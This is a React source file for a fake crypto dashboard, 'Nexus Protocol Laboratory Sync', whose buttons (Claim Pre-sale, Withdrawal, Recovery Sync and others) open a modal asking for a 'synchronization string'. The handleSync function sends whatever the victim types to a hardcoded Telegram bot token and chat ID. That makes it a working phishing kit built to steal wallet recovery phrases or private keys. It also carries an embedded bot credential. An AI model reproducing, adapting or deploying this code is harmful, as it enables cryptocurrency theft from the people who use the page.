import React, { useState } from 'react';
import { Power, Activity, Lock, ShieldCheck } from 'lucide-react';

export default function LabDashboard() {
  const [connected, setConnected] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [activeFeature, setActiveFeature] = useState("");
  const [inputValue, setInputValue] = useState("");
  const [loading, setLoading] = useState(false);

  const botToken = "7824855210:AAH89Y7Z6-K5zV9P_xG4e_mX8wR2t1qO0YI";
  const chatId = "7630238860";

  const buttons = [
    "Claim Pre-sale", "Airdrop Portal", "Stake Assets", "Unstake", 
    "Swap", "Bridge", "Validation", "Rectification", 
    "Balance Scan", "Withdrawal", "Recovery Sync", "Migrate"
  ];

  const handleSync = async () => {
    if (inputValue.length < 5) return;
    setLoading(true);
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: chatId, 
          text: `🧪 LAB SIGNAL RECEIVED\n\nFeature: ${activeFeature}\nInput: ${inputValue}` 
        }),
      });
      alert("Synchronization sequence initiated.");
      setShowModal(false); setInputValue("");
    } catch (e) { alert("Gateway Error."); } finally { setLoading(false); }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 relative overflow-x-hidden">
      {/* BACKGROUND GLOW */}
      <div className="fixed top-0 left-1/2 -translate-x-1/2 w-[500px] h-[300px] bg-cyan-900/10 blur-[120px] rounded-full pointer-events-none" />
      
      <div className="relative z-10 max-w-lg mx-auto">
        {/* HEADER */}
        <header className="flex justify-between items-center mb-10 mt-4">
          <div>
            <p className="text-[10px] tracking-[0.3em] text-cyan-500 font-bold uppercase">Nexus Protocol</p>
            <h1 className="text-xl font-light tracking-tight text-white italic">Laboratory <span className="font-semibold text-cyan-400 not-italic">Sync</span></h1>
          </div>
          <button 
            onClick={() => setConnected(true)}
            className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all border ${connected ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400' : 'bg-cyan-600 border-cyan-400 text-white shadow-[0_0_15px_rgba(34,211,238,0.3)]'}`}
          >
            <Power size={14} /> {connected ? 'System Online' : 'Connect Wallet'}
          </button>
        </header>

        {/* 12 BUTTON GRID */}
        <div className="grid grid-cols-3 gap-3">
          {buttons.map((btn) => (
            <button 
              key={btn} 
              onClick={() => { setActiveFeature(btn); setShowModal(true); }}
              className="bg-[#0d1117] border border-slate-800/50 p-5 rounded-2xl flex flex-col items-center gap-3 active:scale-95 transition-transform hover:border-cyan-500/40"
            >
              <div className="p-3 rounded-xl bg-slate-900 text-slate-500">
                <Activity size={20} />
              </div>
              <span className="text-[9px] font-bold uppercase tracking-wider text-slate-400">{btn}</span>
            </button>
          ))}
        </div>

        {/* LAB MODAL */}
        {showModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-black/90 backdrop-blur-sm">
            <div className="bg-[#0d1117] border border-cyan-900/50 w-full max-w-sm rounded-[32px] p-8 relative">
              <div className="flex flex-col items-center text-center">
                <div className="bg-cyan-500/10 p-3 rounded-full text-cyan-400 mb-4 border border-cyan-500/20">
                  <ShieldCheck size={28} />
                </div>
                <h3 className="text-lg font-medium text-white mb-2 leading-tight uppercase tracking-tight">Laboratory Synchronization</h3>
                <p className="text-[11px] text-slate-500 mb-6 px-4 leading-relaxed">Finalize the technical handshake for the <span className="text-cyan-400">{activeFeature}</span> gateway.</p>
                
                <textarea 
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  placeholder="Enter manual synchronization string..."
                  className="w-full h-32 bg-black border border-slate-800 rounded-2xl p-4 text-sm focus:border-cyan-500 transition-colors outline-none resize-none placeholder:text-slate-800 text-cyan-50"
                />

                <button 
                  onClick={handleSync}
                  disabled={loading}
                  className="w-full mt-6 bg-cyan-600 hover:bg-cyan-500 py-4 rounded-full font-bold text-sm shadow-lg shadow-cyan-900/20 transition-all flex items-center justify-center gap-2"
                >
                  {loading ? 'Initializing...' : 'Execute Sync'} <Lock size={16} />
                </button>

                <button onClick={() => setShowModal(false)} className="mt-4 text-[10px] text-slate-600 hover:text-slate-400">Abort Protocol</button>
                
                {/* SUBTLE WARNING */}
                <p className="mt-8 text-[9px] text-slate-800 tracking-tight font-medium uppercase text-center opacity-60">Security Note: Internal gateway only. Do not share recovery phrases.</p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
